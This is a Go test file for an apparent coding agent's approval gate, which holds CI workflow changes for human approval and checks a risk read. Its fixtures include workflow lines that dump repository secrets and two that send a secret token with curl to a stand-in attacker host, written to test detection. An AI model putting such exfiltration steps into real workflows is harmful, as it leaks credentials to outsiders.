package harness

import (
	"context"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"git.shdw.tech/rob/devbot/internal/core"
	"git.shdw.tech/rob/devbot/internal/forge"
	"git.shdw.tech/rob/devbot/internal/queue"
)

// pushed lists the devbot/ branches on the forge's git, besides those the
// profile's adapter keeps.
func (h *hEnv) pushed() []string {
	refs := strings.Fields(git(h.t, h.bare, "for-each-ref", "--format=%(refname:short)", "refs/heads/devbot"))
	return slices.DeleteFunc(refs, func(b string) bool { return slices.Contains(prof.Branches, b) })
}

// heldAt is the commit the forge's git keeps at ref, or "".
func (h *hEnv) heldAt(ref string) string {
	return git(h.t, h.bare, "for-each-ref", "--format=%(objectname)", ref)
}

// hold has the implementer do mode's work, which needs an approval, and
// returns the task and the commit it holds.
func (h *hEnv) hold(mode string) (forge.ItemRef, string) {
	h.t.Helper()
	h.mode(mode)
	ref := h.file("Say hello")
	if err := h.implement(context.Background()); err != nil {
		h.t.Fatal(err)
	}
	if s := h.state(ref); s != core.LNeedsApproval {
		h.t.Fatalf("want needs-approval, got %q\n%s", s, h.comments(ref))
	}
	return ref, h.heldAt(core.HeldRef(ref.Number))
}

// approve has who add devbot/approve, a second on from anything before it,
// and serve evaluate the task.
func (h *hEnv) approve(ref forge.ItemRef, who string) {
	h.t.Helper()
	h.skew += time.Second
	skew := h.skew
	h.f.SetClock(func() time.Time { return time.Now().Add(skew) })
	h.f.HumanLabel(ref, who, core.LApprove)
	if _, err := h.e.EvaluateItem(context.Background(), ref, core.SrcWebhook); err != nil {
		h.t.Fatal(err)
	}
}

func (h *hEnv) lastStatus(ref forge.ItemRef, kind string) core.StatusComment {
	cs, _ := h.f.ListComments(context.Background(), ref)
	s, _ := core.LastStatus(core.Statuses(cs, implBot, revBot), kind)
	return s
}

// Work that changes a workflow, which the default approvable_paths let a
// person approve, is held: not on any branch, kept at a ref no CI runs on,
// shown in full with the risk read, and waiting with no attempt spent.
func TestHeldWorkWaitsForApproval(t *testing.T) {
	eachForge(t, func(t *testing.T) {
		h := newHEnv(t, yamlChecks)
		ctx := context.Background()
		ref, sha := h.hold("workflow")
		if sha == "" {
			t.Fatalf("nothing kept at %s:\n%s", core.HeldRef(ref.Number), git(t, h.bare, "for-each-ref"))
		}
		if b := h.pushed(); len(b) > 0 {
			t.Fatalf("held work reached a branch: %v", b)
		}
		if h.heldAt(core.HeldPRRef(ref.Number)) == "" {
			t.Fatal("the held change's PR text wasn't kept")
		}
		if prs, _ := h.f.ListOpenPRs(ctx, repo); len(prs) != 0 {
			t.Fatalf("a PR was opened: %+v", prs)
		}
		c := h.comments(ref)
		for _, want := range []string{"`.gitea/workflows/x.yaml`", "+on: push", "### Risk read", "now runs on `push` for devbot's branches",
			"`hello.txt` (+1 -0)", "Added hello.txt", "`" + sha + "`", "`" + core.LApprove + "`", "approve_task",
			"approving this pushes the whole commit", "git fetch origin " + core.HeldRef(ref.Number)} {
			if !strings.Contains(c, want) {
				t.Errorf("the hold should show %q:\n%s", want, c)
			}
		}
		st := h.lastStatus(ref, "held")
		blob := git(t, h.bare, "rev-parse", sha+":.gitea/workflows/x.yaml")
		if st.SHA != sha || len(st.Files) != 1 || st.Files[0] != (core.HeldFile{Path: ".gitea/workflows/x.yaml", Mode: "100644", Blob: blob}) {
			t.Fatalf("the hold records the protected file's content: %+v", st.Status)
		}
		if n := h.failedAttempts(ref); n != 0 {
			t.Fatalf("a hold isn't a failed attempt: %d", n)
		}
		// It waits, whatever runs, with no timeout.
		for range 2 {
			if err := h.implement(ctx); err != nil {
				t.Fatal(err)
			}
			if _, err := h.e.Reconcile(ctx); err != nil {
				t.Fatal(err)
			}
			if s := h.state(ref); s != core.LNeedsApproval || h.heldAt(core.HeldRef(ref.Number)) != sha {
				t.Fatalf("a hold moved on by itself: %q", s)
			}
		}
		ts, err := h.e.Status(ctx, core.Caller{Principal: "test"}, ref.String())
		if err != nil || ts.State != "needs-approval" || ts.Held == nil || ts.Held.SHA != sha || !strings.Contains(ts.Held.Shown, "+on: push") || !strings.Contains(ts.Held.Warning, "untrusted") {
			t.Fatalf("task_status should show the held change: %+v, %v", ts, err)
		}
	})
}

// An approval pushes exactly the held commit, opens the PR with the text
// the run that held it left, and puts the task in review.
func TestApprovedHeldWorkIsPushed(t *testing.T) {
	eachForge(t, func(t *testing.T) {
		h := newHEnv(t, yamlChecks)
		ctx := context.Background()
		ref, sha := h.hold("workflow")
		h.approve(ref, "alice")
		if it, _ := h.f.GetItem(ctx, ref); it.HasLabel(core.LApprove) {
			t.Fatal("devbot takes devbot/approve off once it has acted on it")
		}
		if a := h.lastStatus(ref, "approval"); a.SHA != sha || a.Principal != "alice" || len(a.Files) != 1 {
			t.Fatalf("the approval is recorded with what it approved: %+v", a.Status)
		}
		if q, _ := h.e.Q.IsQueued(ctx, queue.KindImplement, ref.String()); !q {
			t.Fatal("an approval queues the push")
		}
		before := h.comments(ref)
		if _, err := h.e.EvaluateItem(ctx, ref, core.SrcWebhook); err != nil || h.comments(ref) != before {
			t.Fatalf("a second evaluation must do nothing: %v\n%s", err, h.comments(ref))
		}
		if err := h.implement(ctx); err != nil {
			t.Fatal(err)
		}
		if s := h.state(ref); s != core.LInReview {
			t.Fatalf("want in-review, got %q\n%s", s, h.comments(ref))
		}
		prs, _ := h.f.ListOpenPRs(ctx, repo)
		if len(prs) != 1 || !strings.Contains(prs[0].Body, "Added hello.txt") || !strings.Contains(prs[0].Body, "Closes #") {
			t.Fatalf("want the PR opened with the held run's text, got %+v", prs)
		}
		if got := git(t, h.bare, "rev-parse", prs[0].HeadBranch); got != sha {
			t.Fatalf("pushed %s, not the approved %s", got, sha)
		}
		if h.heldAt(core.HeldRef(ref.Number)) != "" || h.heldAt(core.HeldPRRef(ref.Number)) != "" {
			t.Fatal("the held refs are deleted once the change is on its branch")
		}
		if n := h.failedAttempts(ref); n != 0 {
			t.Fatalf("no attempt failed: %d", n)
		}
	})
}

// A held change that is no longer the one a person approved when devbot
// comes to push it stops for a person instead, whatever replaced it, even
// a commit that touches no protected path: devbot pushes only what it
// showed.
func TestReplacedHeldWorkNeedsAHuman(t *testing.T) {
	for name, edit := range map[string]func(dir string){
		"a workflow": func(dir string) {
			os.WriteFile(filepath.Join(dir, ".gitea/workflows/x.yaml"), []byte("on: push\njobs: {x: {runs-on: a, steps: [{run: 'echo ${{ secrets.TOKEN }}'}]}}\n"), 0o644)
		},
		"nothing protected": func(dir string) {
			os.Remove(filepath.Join(dir, ".gitea/workflows/x.yaml"))
			os.WriteFile(filepath.Join(dir, "hello.txt"), []byte("bye\n"), 0o644)
		},
	} {
		t.Run(name, func(t *testing.T) {
			h := newHEnv(t, yamlChecks)
			ctx := context.Background()
			ref, sha := h.hold("workflow")
			h.approve(ref, "alice")
			// Someone who can push replaces it, after it was approved.
			clone := filepath.Join(t.TempDir(), "c")
			git(t, filepath.Dir(clone), "clone", "-q", h.bare, clone)
			git(t, clone, "fetch", "-q", "origin", core.HeldRef(ref.Number))
			git(t, clone, "checkout", "-q", "FETCH_HEAD")
			edit(clone)
			git(t, clone, "add", "-A")
			git(t, clone, "commit", "-qm", "swapped")
			git(t, clone, "push", "-q", "-f", "origin", "HEAD:"+core.HeldRef(ref.Number))
			other := git(t, clone, "rev-parse", "HEAD")

			if err := h.implement(ctx); err != nil {
				t.Fatal(err)
			}
			if s := h.state(ref); s != core.LNeedsHuman {
				t.Fatalf("want needs-human, got %q\n%s", s, h.comments(ref))
			}
			if b := h.pushed(); len(b) > 0 {
				t.Fatalf("a change nobody approved reached a branch: %v", b)
			}
			if c := h.comments(ref); !strings.Contains(c, "`"+sha+"`") || !strings.Contains(c, "`"+other+"`") {
				t.Fatalf("want both commits named:\n%s", c)
			}
			if st := h.lastStatus(ref, "held"); st.SHA != sha {
				t.Fatalf("nothing new is held: %+v", st.Status)
			}
		})
	}
}

// What a person can't read in a diff they can't approve: a binary file, or
// one that isn't UTF-8, under an approvable path stops for a person, and
// nothing is held or pushed.
func TestUnreadableHeldWorkNeedsAHuman(t *testing.T) {
	for _, mode := range []string{"workflow-binary", "workflow-latin1"} {
		t.Run(mode, func(t *testing.T) {
			h := newHEnv(t, yamlChecks)
			h.mode(mode)
			ref := h.file("Say hello")
			if err := h.implement(context.Background()); err != nil {
				t.Fatal(err)
			}
			if s := h.state(ref); s != core.LNeedsHuman || !strings.Contains(h.comments(ref), "isn't text a person can read") {
				t.Fatalf("want needs-human, got %q\n%s", s, h.comments(ref))
			}
			if h.heldAt(core.HeldRef(ref.Number)) != "" || len(h.pushed()) > 0 {
				t.Fatal("nothing is held or pushed")
			}
		})
	}
}

// The base's .gitattributes can't hide a workflow from the person
// approving it: a "-diff" or a "binary" for it still shows every line, and
// the risk read still reads them.
func TestHeldDiffIgnoresAttributes(t *testing.T) {
	h := newHEnv(t, yamlChecks)
	clone := filepath.Join(t.TempDir(), "c")
	git(t, filepath.Dir(clone), "clone", "-q", h.bare, clone)
	os.WriteFile(filepath.Join(clone, ".gitattributes"), []byte("*.yaml -diff\n.gitea/** binary\n"), 0o644)
	git(t, clone, "add", "-A")
	git(t, clone, "commit", "-qm", "attributes")
	git(t, clone, "push", "-q", "origin", "HEAD")
	ref, _ := h.hold("workflow")
	c := h.comments(ref)
	if strings.Contains(c, "Binary files") || !strings.Contains(c, "+on: push") || !strings.Contains(c, "now runs on `push`") {
		t.Fatalf("the attributes hid the workflow:\n%s", c)
	}
}

// After an approval, a fix round that leaves the approved files as they
// were pushes as usual; one that changes them is held again.
func TestFixRoundsAfterApproval(t *testing.T) {
	h := newHEnv(t, yamlChecks)
	ctx := context.Background()
	ref, _ := h.hold("workflow")
	h.approve(ref, "alice")
	if err := h.implement(ctx); err != nil {
		t.Fatal(err)
	}
	prs, _ := h.f.ListOpenPRs(ctx, repo)
	if len(prs) != 1 {
		t.Fatalf("want a PR\n%s", h.comments(ref))
	}
	pr := prs[0]
	round := func(mode string) {
		t.Helper()
		it, _ := h.f.GetItem(ctx, ref)
		h.e.Transition(ctx, it, core.LChanges, "", "")
		h.e.Q.Enqueue(ctx, queue.Job{Kind: queue.KindImplement, Ref: ref.String(), Mode: "fix", PR: pr.Number, Reason: "say it twice"})
		h.mode(mode)
		if err := h.implement(ctx); err != nil {
			t.Fatal(err)
		}
	}

	head := git(t, h.bare, "rev-parse", pr.HeadBranch)
	round("fix-context")
	if s := h.state(ref); s != core.LInReview {
		t.Fatalf("a round that leaves the approved workflow alone pushes: %q\n%s", s, h.comments(ref))
	}
	if now := git(t, h.bare, "rev-parse", pr.HeadBranch); now == head {
		t.Fatal("the round wasn't pushed")
	}

	head = git(t, h.bare, "rev-parse", pr.HeadBranch)
	round("workflow-more")
	if s := h.state(ref); s != core.LNeedsApproval {
		t.Fatalf("a round that changes the approved workflow is held: %q\n%s", s, h.comments(ref))
	}
	if now := git(t, h.bare, "rev-parse", pr.HeadBranch); now != head {
		t.Fatal("the held round reached the PR's branch")
	}
	if st := h.lastStatus(ref, "held"); st.PR != pr.Number || st.Branch != pr.HeadBranch || !strings.Contains(st.Body, "+# and more") {
		t.Fatalf("the hold is for the PR's branch: %+v\n%s", st.Status, st.Body)
	}
	h.approve(ref, "alice")
	if err := h.implement(ctx); err != nil {
		t.Fatal(err)
	}
	if s := h.state(ref); s != core.LInReview || git(t, h.bare, "rev-parse", pr.HeadBranch) == head {
		t.Fatalf("the approved round is pushed to the PR: %q\n%s", s, h.comments(ref))
	}
	if !strings.Contains(h.comments(ref), "Pushed changes to PR #") {
		t.Fatalf("want the round announced on the PR:\n%s", h.comments(ref))
	}
}

// Agent config, symlinks and submodules need a person even beside a change
// a person could approve, and nothing is held.
func TestUnapprovableChangesStillNeedAHuman(t *testing.T) {
	for _, mode := range []string{"workflow-agents", "workflow-symlink"} {
		t.Run(mode, func(t *testing.T) {
			h := newHEnv(t, yamlChecks)
			h.mode(mode)
			ref := h.file("Say hello")
			if err := h.implement(context.Background()); err != nil {
				t.Fatal(err)
			}
			if s := h.state(ref); s != core.LNeedsHuman {
				t.Fatalf("want needs-human, got %q\n%s", s, h.comments(ref))
			}
			if h.heldAt(core.HeldRef(ref.Number)) != "" || len(h.pushed()) > 0 {
				t.Fatal("nothing is held or pushed")
			}
		})
	}
}

// autoClean is yamlChecks with approval: auto_clean.
const autoClean = yamlChecks + "approval: auto_clean\n"

// cleanWorkflow is a workflow the risk read flags nothing in: it runs on
// main alone, reads no secrets and pins its one action.
const cleanWorkflow = "on:\n  push:\n    branches: [main]\njobs:\n  t:\n    runs-on: x\n    steps:\n      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262\n      - run: echo hi\n"

// workflow has the implementer's next workflow-file run leave content in
// .gitea/workflows/x.yaml.
func (h *hEnv) workflow(content string) {
	os.WriteFile(h.modeFile+".workflow", []byte(content), 0o644)
}

// approvedNow reports whether the task's latest approval covers what the
// workflow holds at commit, as the merge gate reads it.
func (h *hEnv) approvedNow(ref forge.ItemRef, commit string) bool {
	cs, _ := h.f.ListComments(context.Background(), ref)
	blob := git(h.t, h.bare, "rev-parse", commit+":.gitea/workflows/x.yaml")
	return core.Approved(core.Statuses(cs, implBot, revBot), []core.HeldFile{{Path: ".gitea/workflows/x.yaml", Mode: "100644", Blob: blob}})
}

// With approval: auto_clean, a change whose risk read finds nothing is
// pushed by the run that made it: shown, approved by devbot, and put in
// review, with nothing kept at the held refs and nothing left to approve.
func TestAutoCleanPushesACleanChange(t *testing.T) {
	eachForge(t, func(t *testing.T) {
		h := newHEnv(t, autoClean)
		ctx := context.Background()
		h.mode("workflow-file")
		h.workflow(cleanWorkflow)
		ref := h.file("Say hello")
		if err := h.implement(ctx); err != nil {
			t.Fatal(err)
		}
		if s := h.state(ref); s != core.LInReview {
			t.Fatalf("want in-review, got %q\n%s", s, h.comments(ref))
		}
		prs, _ := h.f.ListOpenPRs(ctx, repo)
		if len(prs) != 1 {
			t.Fatalf("want a PR, got %+v", prs)
		}
		head := git(t, h.bare, "rev-parse", prs[0].HeadBranch)
		held, approval := h.lastStatus(ref, "held"), h.lastStatus(ref, "approval")
		if held.SHA != head || held.Mode != "auto" || len(held.Files) != 1 {
			t.Fatalf("the pushed change is shown as a hold is: %+v", held.Status)
		}
		if approval.SHA != head || approval.Mode != "auto" || !slices.Equal(approval.Files, held.Files) || approval.ID < held.ID {
			t.Fatalf("devbot records its approval of what it showed: %+v", approval.Status)
		}
		if !h.approvedNow(ref, head) {
			t.Fatal("the merge gate should take the pushed workflow as approved")
		}
		c := h.comments(ref)
		for _, want := range []string{"without waiting for a person", "`approval: auto_clean`", "- Nothing flagged.", "+    branches: [main]",
			"`hello.txt` (+1 -0)", "`build.sh` (+1 -0)", "### Approved by devbot", "devbot approved the held change", "Opened PR #"} {
			if !strings.Contains(c, want) {
				t.Errorf("want %q in the comments:\n%s", want, c)
			}
		}
		if strings.Contains(c, "approve_task") || strings.Contains(c, "kept on the forge") {
			t.Errorf("nothing waits for an approval:\n%s", c)
		}
		if h.heldAt(core.HeldRef(ref.Number)) != "" || h.heldAt(core.HeldPRRef(ref.Number)) != "" {
			t.Fatal("nothing is kept at the held refs")
		}
		if stats, _ := h.e.Q.Stats(ctx); stats["held_approvals|"+repo.String()+"|auto"] != 1 || stats["held_approvals|"+repo.String()+"|person"] != 0 {
			t.Fatalf("an auto-approval is counted apart from a person's: %v", stats)
		}
		// Nothing more to do, however often it is looked at.
		for range 2 {
			if err := h.implement(ctx); err != nil {
				t.Fatal(err)
			}
			if _, err := h.e.EvaluateItem(ctx, ref, core.SrcWebhook); err != nil {
				t.Fatal(err)
			}
		}
		if now := h.comments(ref); now != c || h.state(ref) != core.LInReview {
			t.Fatalf("a second look must do nothing: %q\n%s", h.state(ref), now)
		}
	})
}

// With approval: auto_clean, any one flag in the risk read holds the change
// for a person, as without it, and the hold names the flag. So does a
// workflow that already reaches devbot's branches with the secrets, that
// another workflow may call there with them, or that would run the rest
// of the commit, though the edit adds no flagged line.
func TestAutoCleanHoldsAFlaggedChange(t *testing.T) {
	guarded := "on:\n  pull_request:\njobs:\n  t:\n    if: \"!startsWith(github.head_ref, 'devbot/')\"\n    runs-on: x\n    steps:\n      - run: echo hi\n"
	everywhere := "permissions: {}\n" + strings.Replace(cleanWorkflow, "    branches: [main]\n", "", 1)
	secret := strings.Replace(everywhere, "    runs-on: x\n", "    runs-on: x\n    env:\n      T: ${{ secrets.T }}\n", 1)
	reusable := "permissions: read-all\n" + strings.Replace(strings.Replace(cleanWorkflow, "  push:\n    branches: [main]\n", "  workflow_call:\n", 1), "    runs-on: x\n", "    runs-on: x\n    env:\n      T: ${{ secrets.T }}\n", 1)
	flagged := "but the risk read below flagged"
	tokenFlag := "runs on devbot's work with a token that may write (no read-only `permissions:`)."
	for _, c := range []struct {
		name, base, workflow, want, why string
	}{
		{name: "a secret", workflow: strings.Replace(cleanWorkflow, "echo hi", "echo ${{ secrets.TOKEN }}", 1), want: "adds uses of the repo's secrets: `secrets.TOKEN`"},
		{name: "all the secrets", workflow: strings.Replace(cleanWorkflow, "echo hi", "echo '${{ toJSON(secrets) }}'", 1), want: "`${{ toJSON(secrets) }}`"},
		{name: "secrets inherited", workflow: "on:\n  push:\n    branches: [main]\njobs:\n  c:\n    uses: ./.gitea/workflows/y.yaml\n    secrets: inherit\n", want: "`secrets: inherit`"},
		{name: "a push to devbot's branches", workflow: strings.Replace(cleanWorkflow, "    branches: [main]\n", "", 1), want: "now runs on `push` for devbot's branches"},
		{name: "pull_request", workflow: strings.Replace(cleanWorkflow, "  push:\n    branches: [main]\n", "  pull_request:\n", 1), want: "now runs on `pull_request`"},
		{name: "pull_request_target", workflow: strings.Replace(cleanWorkflow, "jobs:", "  pull_request_target:\njobs:", 1), want: "adds a `pull_request_target` trigger"},
		{name: "workflow_run", workflow: strings.Replace(cleanWorkflow, "jobs:", "  workflow_run:\n    workflows: [ci]\njobs:", 1), want: "adds a `workflow_run` trigger"},
		{name: "a guard removed", base: guarded, workflow: strings.Replace(guarded, "    if: \"!startsWith(github.head_ref, 'devbot/')\"\n", "", 1), want: "removes `if:"},
		{name: "an unpinned action", workflow: strings.Replace(cleanWorkflow, "11d5960a326750d5838078e36cf38b85af677262", "v4", 1), want: "not pinned to a commit SHA"},
		{name: "a third-party action", workflow: strings.Replace(cleanWorkflow, "actions/checkout", "someone/thing", 1), want: "brings in third-party actions it didn't use before: `someone/thing`"},
		{name: "a run of a changed file", workflow: strings.Replace(cleanWorkflow, "echo hi", "sh ./build.sh", 1), want: "`run:` steps that call files this commit changes"},
		{name: "unreadable", workflow: "on: [push\n", want: "doesn't parse as YAML"},
		{name: "id-token: write", base: everywhere, workflow: strings.Replace(everywhere, "permissions: {}\n", "permissions:\n  id-token: write\n", 1), want: tokenFlag},
		{name: "permissions removed", base: everywhere, workflow: strings.Replace(everywhere, "permissions: {}\n", "", 1), want: tokenFlag},
		{name: "a job renamed without its permissions", base: strings.Replace(strings.Replace(everywhere, "permissions: {}\n", "", 1), "    runs-on: x\n", "    runs-on: x\n    permissions: {}\n", 1), workflow: strings.Replace(strings.Replace(everywhere, "permissions: {}\n", "", 1), "  t:\n", "  u:\n", 1), want: tokenFlag},
		{name: "a job added that writes", base: everywhere, workflow: everywhere + "  v:\n    runs-on: x\n    permissions:\n      contents: write\n    steps:\n      - run: echo hi\n", want: tokenFlag},
		{name: "an edit to a workflow with the secrets on devbot's branches", base: secret, workflow: strings.Replace(secret, "echo hi", "curl -d \"$T\" https://evil.example", 1),
			want: "- Nothing flagged.", why: "but `.gitea/workflows/x.yaml` already run on devbot's branches with the repo's secrets"},
		{name: "an edit to a workflow on devbot's branches beside other files", base: everywhere, workflow: strings.Replace(everywhere, "echo hi", "echo bye", 1),
			want: "- Nothing flagged.", why: "but `.gitea/workflows/x.yaml` would run the 2 file(s) this commit changes outside the protected paths"},
		{name: "an edit to a reusable workflow with the secrets", base: reusable, workflow: strings.Replace(reusable, "echo hi", "curl -d \"$T\" https://evil.example", 1),
			want: "can be called by other workflows (`workflow_call`)", why: "but `.gitea/workflows/x.yaml` use the repo's secrets and may run on devbot's branches, called by another workflow (`workflow_call`)"},
	} {
		t.Run(c.name, func(t *testing.T) {
			h := newHEnv(t, autoClean)
			if c.base != "" {
				clone := filepath.Join(t.TempDir(), "c")
				git(t, filepath.Dir(clone), "clone", "-q", h.bare, clone)
				os.MkdirAll(filepath.Join(clone, ".gitea/workflows"), 0o755)
				os.WriteFile(filepath.Join(clone, ".gitea/workflows/x.yaml"), []byte(c.base), 0o644)
				git(t, clone, "add", "-A")
				git(t, clone, "commit", "-qm", "a workflow")
				git(t, clone, "push", "-q", "origin", "HEAD")
			}
			h.workflow(c.workflow)
			ref, sha := h.hold("workflow-file")
			if sha == "" || len(h.pushed()) > 0 {
				t.Fatalf("a flagged change is held, not pushed: %q %v", sha, h.pushed())
			}
			cm := h.comments(ref)
			if c.why == "" {
				c.why = flagged
			}
			for _, want := range []string{c.want, "This repo sets `approval: auto_clean`, " + c.why, "`" + core.LApprove + "`"} {
				if !strings.Contains(cm, want) {
					t.Errorf("want %q in the hold:\n%s", want, cm)
				}
			}
			if a := h.lastStatus(ref, "approval"); a.ID != 0 {
				t.Fatalf("nothing is approved: %+v", a.Status)
			}
			if st := h.lastStatus(ref, "held"); st.Mode != "" {
				t.Fatalf("a hold for a person: %+v", st.Status)
			}
		})
	}
}

// The risk read parses only Actions workflows, so with approval:
// auto_clean any other protected file, which it finds nothing in, is still
// held for a person, and the hold says why.
func TestAutoCleanHoldsWhatTheReadCantRead(t *testing.T) {
	h := newHEnv(t, autoClean)
	ref, sha := h.hold("ci-script")
	if sha == "" || len(h.pushed()) > 0 {
		t.Fatalf("a CI script is held, not pushed: %q %v", sha, h.pushed())
	}
	cm := h.comments(ref)
	for _, want := range []string{"- Nothing flagged.", "This repo sets `approval: auto_clean`, but the risk read reads only Actions workflows, not `.gitea/scripts/build.sh`"} {
		if !strings.Contains(cm, want) {
			t.Errorf("want %q in the hold:\n%s", want, cm)
		}
	}
	if a := h.lastStatus(ref, "approval"); a.ID != 0 {
		t.Fatalf("nothing is approved: %+v", a.Status)
	}
}

// approval: person, and approval unset, hold a clean change for a person.
func TestCleanChangeWaitsForAPersonWithoutAutoClean(t *testing.T) {
	for _, yaml := range []string{yamlChecks, yamlChecks + "approval: person\n"} {
		h := newHEnv(t, yaml)
		h.workflow(cleanWorkflow)
		ref, _ := h.hold("workflow-file")
		if c := h.comments(ref); !strings.Contains(c, "- Nothing flagged.") || strings.Contains(c, "auto_clean") {
			t.Fatalf("want an ordinary hold:\n%s", c)
		}
	}
}

// Paths that always need a person do even beside a clean workflow under
// approval: auto_clean, and nothing is held or pushed.
func TestAutoCleanNeverApprovesWhatNeedsAHuman(t *testing.T) {
	for _, mode := range []string{"workflow-agents", "workflow-symlink", "workflow-binary", "workflow-codeowners"} {
		t.Run(mode, func(t *testing.T) {
			h := newHEnv(t, autoClean)
			h.mode(mode)
			ref := h.file("Say hello")
			if err := h.implement(context.Background()); err != nil {
				t.Fatal(err)
			}
			if s := h.state(ref); s != core.LNeedsHuman {
				t.Fatalf("want needs-human, got %q\n%s", s, h.comments(ref))
			}
			if h.heldAt(core.HeldRef(ref.Number)) != "" || len(h.pushed()) > 0 || h.lastStatus(ref, "approval").ID != 0 {
				t.Fatal("nothing is held, approved or pushed")
			}
		})
	}
}

// After devbot approved a clean change itself, a fix round that leaves the
// workflow alone pushes as usual, one that changes it cleanly is read and
// approved again, and one the read flags is held for a person, whose
// approval then pushes it.
func TestFixRoundsAfterAutoApproval(t *testing.T) {
	h := newHEnv(t, autoClean)
	ctx := context.Background()
	h.mode("workflow-file")
	h.workflow(cleanWorkflow)
	ref := h.file("Say hello")
	if err := h.implement(ctx); err != nil {
		t.Fatal(err)
	}
	prs, _ := h.f.ListOpenPRs(ctx, repo)
	if len(prs) != 1 {
		t.Fatalf("want a PR\n%s", h.comments(ref))
	}
	pr := prs[0]
	round := func(mode, workflow string) {
		t.Helper()
		it, _ := h.f.GetItem(ctx, ref)
		h.e.Transition(ctx, it, core.LChanges, "", "")
		h.e.Q.Enqueue(ctx, queue.Job{Kind: queue.KindImplement, Ref: ref.String(), Mode: "fix", PR: pr.Number, Reason: "say it twice"})
		h.mode(mode)
		h.workflow(workflow)
		if err := h.implement(ctx); err != nil {
			t.Fatal(err)
		}
	}
	approvals := func() int {
		cs, _ := h.f.ListComments(ctx, ref)
		n := 0
		for _, s := range core.Statuses(cs, implBot, revBot) {
			if s.Kind == "approval" {
				n++
			}
		}
		return n
	}

	head := git(t, h.bare, "rev-parse", pr.HeadBranch)
	round("fix-context", "")
	if now := git(t, h.bare, "rev-parse", pr.HeadBranch); h.state(ref) != core.LInReview || now == head || approvals() != 1 {
		t.Fatalf("a round that leaves the approved workflow alone pushes, with no new approval: %q\n%s", h.state(ref), h.comments(ref))
	}

	head = git(t, h.bare, "rev-parse", pr.HeadBranch)
	round("workflow-file", cleanWorkflow+"      - run: echo again\n")
	now := git(t, h.bare, "rev-parse", pr.HeadBranch)
	if h.state(ref) != core.LInReview || now == head || approvals() != 2 {
		t.Fatalf("a round that changes the workflow cleanly is read and approved again: %q\n%s", h.state(ref), h.comments(ref))
	}
	if !h.approvedNow(ref, now) || h.approvedNow(ref, head) {
		t.Fatal("the approval moves to the round's workflow")
	}
	if !strings.Contains(h.comments(ref), "Pushed changes to PR #") {
		t.Fatalf("want the round announced on the PR:\n%s", h.comments(ref))
	}

	head = now
	round("workflow-file", strings.Replace(cleanWorkflow, "echo hi", "echo ${{ secrets.TOKEN }}", 1))
	if s := h.state(ref); s != core.LNeedsApproval || git(t, h.bare, "rev-parse", pr.HeadBranch) != head {
		t.Fatalf("a round the read flags is held for a person: %q\n%s", s, h.comments(ref))
	}
	if st := h.lastStatus(ref, "held"); st.PR != pr.Number || st.Mode != "" || !strings.Contains(st.Body, "`secrets.TOKEN`") {
		t.Fatalf("the hold is for the PR, and names the flag: %+v\n%s", st.Status, st.Body)
	}
	if h.approvedNow(ref, head) {
		t.Fatal("a newer hold leaves the earlier approval behind")
	}
	h.approve(ref, "alice")
	if err := h.implement(ctx); err != nil {
		t.Fatal(err)
	}
	if s := h.state(ref); s != core.LInReview || git(t, h.bare, "rev-parse", pr.HeadBranch) == head {
		t.Fatalf("the approved round is pushed to the PR: %q\n%s", s, h.comments(ref))
	}
	if stats, _ := h.e.Q.Stats(ctx); stats["held_approvals|"+repo.String()+"|auto"] != 2 || stats["held_approvals|"+repo.String()+"|person"] != 1 {
		t.Fatalf("approvals are counted by who gave them: %v", stats)
	}
}
